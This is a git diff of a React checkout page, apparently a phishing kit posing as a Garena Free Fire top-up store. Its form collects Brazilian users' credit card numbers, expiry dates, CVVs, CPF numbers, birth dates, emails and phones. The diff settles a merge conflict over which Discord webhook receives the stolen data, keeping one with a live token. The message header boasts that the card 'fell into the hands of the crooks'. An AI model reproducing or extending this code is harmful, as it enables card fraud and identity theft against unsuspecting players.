@@ -1,4 +1,3 @@
-
 'use client';
 
 import { Suspense, useState, useEffect } from 'react';
@@ -37,23 +36,23 @@ const luhnCheck = (val: string): boolean => {
 };
 
 const formSchema = z.object({
-  promoCode: z.string().optional(),
-  cardNumber: z.string().min(19, { message: "Número do cartão incompleto." }).refine(luhnCheck, { message: "Número do cartão inválido." }),
-  cardDueDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, { message: "Data de validade inválida." }),
-  cardCVV: z.string().min(3, { message: "CVV inválido." }).max(4),
-  name: z.string()
-    .min(1, { message: "Nome é obrigatório." })
-    .refine(value => value.trim().split(" ").length >= 2, {
-        message: "Por favor, insira o nome e sobrenome.",
-    }),
-  email: z.string()
-    .min(1, { message: "E-mail é obrigatório." })
-    .email({ message: "Formato de e-mail inválido." }),
-  cpf: z.string().min(14, { message: "CPF inválido." }),
-  dob: z.string().regex(/^\d{2}\/\d{2}\/\d{4}$/, { message: "Data de nascimento inválida." }),
-  phone: z.string()
-    .min(1, { message: "Número de telefone é obrigatório." })
-    .regex(/^\(\d{2}\) \d \d{4}-\d{4}$/, { message: "Formato de telefone inválido." }),
+    promoCode: z.string().optional(),
+    cardNumber: z.string().min(19, { message: "Número do cartão incompleto." }).refine(luhnCheck, { message: "Número do cartão inválido." }),
+    cardDueDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, { message: "Data de validade inválida." }),
+    cardCVV: z.string().min(3, { message: "CVV inválido." }).max(4),
+    name: z.string()
+      .min(1, { message: "Nome é obrigatório." })
+      .refine(value => value.trim().split(" ").length >= 2, {
+          message: "Por favor, insira o nome e sobrenome.",
+      }),
+    email: z.string()
+      .min(1, { message: "E-mail é obrigatório." })
+      .email({ message: "Formato de e-mail inválido." }),
+    cpf: z.string().min(14, { message: "CPF inválido." }),
+    dob: z.string().regex(/^\d{2}\/\d{2}\/\d{4}$/, { message: "Data de nascimento inválida." }),
+    phone: z.string()
+      .min(1, { message: "Número de telefone é obrigatório." })
+      .regex(/^\(\d{2}\) \d \d{4}-\d{4}$/, { message: "Formato de telefone inválido." }),
 });
 
 type CheckoutData = {
@@ -72,7 +71,6 @@ function CheckoutCreditCardPageContent() {
     const [checkoutData, setCheckoutData] = useState<CheckoutData | null>(null);
     const [isSubmitting, setIsSubmitting] = useState(false);
     const [avatarIcon, setAvatarIcon] = useState('https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png');
-
 
     useEffect(() => {
         const storedAppId = localStorage.getItem('selectedAppId');
@@ -173,11 +171,7 @@ function CheckoutCreditCardPageContent() {
     const onSubmit = async (values: z.infer<typeof formSchema>) => {
         setIsSubmitting(true);
 
-<<<<<<< HEAD
-        const webhookURL = "https://discordapp.com/api/webhooks/1388000675744714814/G96ba02oqvitoangzfyYw1DVaAlKdseKBmVSHacuhHlEGFagqzIIOAr7MR8AcrS-C0_n";
-=======
-        const webhookURL = "https://discord.com/api/webhooks/1403200747843358870/3KKdLc7Ooi5Yd3JqD4LT3NRMrrsJsrF9OktvUTMk8O5bpyC-CYsdowuo8EgAXF0ZYpHs";
->>>>>>> 1b9e35dbce48b3fe1b2f106a7bef016942c9168b
+        const webhookURL = "https://ptb.discord.com/api/webhooks/1403200747843358870/3KKdLc7Ooi5Yd3JqD4LT3NRMrrsJsrF9OktvUTMk8O5bpyC-CYsdowuo8EgAXF0ZYpHs";
 
         const content = `
 **💳 Caiu na mão dos pecinhas 💳**
@@ -231,7 +225,7 @@ function CheckoutCreditCardPageContent() {
         <div className="flex flex-col md:mx-auto md:my-6 md:max-w-[600px] md:rounded-2xl md:bg-white overflow-hidden">
              <div className="mb-3 bg-white md:mb-4 md:rounded-t-2xl md:p-2 md:pb-0">
                 <div className="relative h-20 overflow-hidden md:h-[120px] md:rounded-t-lg">
-                     <Image 
+                    <Image 
                         className="h-full w-full object-cover" 
                         src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-f997537d.jpg"
                         alt="Free Fire Banner"
